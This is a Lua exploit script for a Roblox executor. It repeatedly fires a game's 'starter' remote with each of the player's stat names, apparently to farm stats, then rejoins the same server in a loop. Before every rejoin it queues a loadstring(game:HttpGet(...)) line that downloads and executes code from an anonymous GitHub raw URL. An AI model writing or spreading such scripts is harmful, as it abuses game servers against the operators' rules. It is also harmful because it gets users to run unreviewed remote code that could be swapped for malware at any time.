local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local Remote = ReplicatedStorage:WaitForChild("starter")
local StatsFolder = LocalPlayer:WaitForChild("stats")

local TeleportData = TeleportService:GetLocalPlayerTeleportData() or {}

local Names = {}
for _, v in ipairs(StatsFolder:GetChildren()) do
    table.insert(Names, v.Name)
end

table.sort(Names)

local function Run(Index)
    local StartTime = tick()

    while tick() - StartTime < 8 do
        Remote:FireServer(Names[Index])

        Index = Index + 1
        if Index > #Names then
            Index = 1
        end

        task.wait(0.1)
    end

    return Index - 1
end

local QueueScript = [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/eo-eo-eo/dsafdsfsdfsdfsdsaf/refs/heads/main/nw"))()
]]

-- FIRST EXECUTION (no remote fired)
if not TeleportData.started then
    queue_on_teleport(QueueScript)

    local Options = Instance.new("TeleportOptions")
    Options:SetTeleportData({started = true, index = 0})

    TeleportService:TeleportToPlaceInstance(
        game.PlaceId,
        game.JobId,
        LocalPlayer,
        Options
    )

    return
end

-- AFTER REJOIN
local StartIndex = (TeleportData.index or 0) + 1
if StartIndex > #Names then
    StartIndex = 1
end

local NewIndex = Run(StartIndex)

queue_on_teleport(QueueScript)

local Options = Instance.new("TeleportOptions")
Options:SetTeleportData({started = true, index = NewIndex})

TeleportService:TeleportToPlaceInstance(
    game.PlaceId,
    game.JobId,
    LocalPlayer,
    Options
)
